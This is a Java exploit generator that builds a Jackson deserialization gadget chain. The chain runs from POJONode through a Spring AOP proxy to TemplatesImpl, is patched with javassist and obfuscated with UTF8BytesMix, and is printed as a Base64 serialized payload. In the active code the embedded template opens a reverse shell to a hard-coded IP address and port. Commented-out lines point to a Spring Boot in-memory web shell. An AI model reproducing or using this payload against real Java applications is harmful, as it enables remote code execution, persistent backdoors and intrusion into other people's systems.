package gadget;

import com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector;
import com.sun.org.apache.xpath.internal.objects.XString;
import gadget.memshell.SpringBootMemoryShellOfController;
import gadget.timu.ByteCompare;
import gadget.timu.MyObjectInputStream;
import javassist.*;
import com.fasterxml.jackson.databind.node.POJONode;
import org.springframework.aop.framework.AdvisedSupport;
import util.GadgetUtils;
import util.SerializerUtils;
import util.TriggertoStringUtils;
import util.UTF8BytesMix;
//import com.sun.jndi.ldap.decodeObject;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;

import static util.GadgetUtils.makeMap;

//BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl
public class Jackson {
    public static void main(String[] args) throws Exception {

//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);

//        final Object template = GadgetUtils.templatesImplLocalWindows();
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();
//        Object template = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19005");
        POJONode node = new POJONode(makeTemplatesImplAopProxy());
//        POJONode node = new POJONode(template);


        Object o = TriggertoStringUtils.eventListenerList(node);
//        BadAttributeValueExpException o = new BadAttributeValueExpException(node);
//        Field valfield = val.getClass().getDeclaredField("val");
//        valfield.setAccessible(true);
//        valfield.set(val, node);
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(val);\
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(o);

        byte[] bytes1 = SerializerUtils.serialize(o);
        bytes1 = new UTF8BytesMix(bytes1).builder();
//        InputStream inputStream = new ByteArrayInputStream(bytes1);
//        MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
//        ByteCompare byteCompare = new ByteCompare();
//        byteCompare.Compared(bytes1);
//        myObjectInputStream.readObject();

        System.out.println(Base64.getEncoder().encodeToString(bytes1));
    }

    public static Object makeTemplatesImplAopProxy() throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
//        Object template = GadgetUtils.getTemplatesImplReverseShell()
        Object template = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19005");
        advisedSupport.setTarget(template);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
}
